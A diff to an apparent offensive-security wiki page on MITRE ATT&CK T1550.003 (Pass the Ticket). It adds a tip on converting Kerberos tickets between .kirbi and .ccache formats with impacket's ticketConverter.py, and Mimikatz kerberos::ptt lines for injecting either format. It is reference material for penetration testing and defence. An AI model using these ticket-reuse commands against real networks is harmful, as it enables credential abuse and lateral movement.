@@ -10,6 +10,20 @@ description: MITRE ATT&CK™ Sub-technique T1550.003
 
 ## Practice
 
+{% hint style="info" %}
+**Tip: convert ticket to UNIX &lt;-&gt; Windows format**
+
+To convert tickets between UNIX/Windows format with [ticketConverter.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py).
+
+```bash
+# Windows -> UNIX
+ticketConverter.py $ticket.kirbi $ticket.ccache
+
+# UNIX -> Windows
+ticketConverter.py $ticket.ccache $ticket.kirbi
+```
+{% endhint %}
+
 ### Injecting the ticket
 
 * On Windows systems, tools like [Mimikatz](https://github.com/gentilkiwi/mimikatz) and [Rubeus](https://github.com/GhostPack/Rubeus) inject the ticket in memory. Native Microsoft tools can then use the ticket just like usual.
@@ -30,7 +44,11 @@ The most simple way of injecting the ticket is to supply the `/ptt` flag directl
 This can also be done manually with [mimikatz](https://github.com/GhostPack/Rubeus) or [Rubeus](https://github.com/GhostPack/Rubeus).
 
 ```bash
+# use a .kirbi file
 kerberos::ptt $ticket_kirbi_file
+
+# use a .ccache file
+kerberos::ptt $ticket_ccache_file
 ```
 
 ```bash
